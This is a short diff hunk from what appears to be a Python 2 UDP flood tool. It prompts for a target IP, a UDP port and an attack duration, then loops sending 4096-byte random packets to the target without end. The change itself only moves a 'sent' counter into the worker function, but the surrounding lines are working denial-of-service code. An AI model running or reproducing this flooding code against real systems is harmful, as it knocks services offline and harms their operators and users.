@@ -13,9 +13,10 @@ bytes = random._urandom(4096)
 victim  = raw_input('Enter your targets ip: ')
 vport = raw_input('Enter \"UDP\" Port number: ')
 duration  = raw_input('Time for attack in seconds: ')
-sent = 0
+
 
 def worker(victim, vport):
+    sent = 0
     print "hey"
     while 1 == 1:
         client.sendto(bytes, (victim, int(vport)))
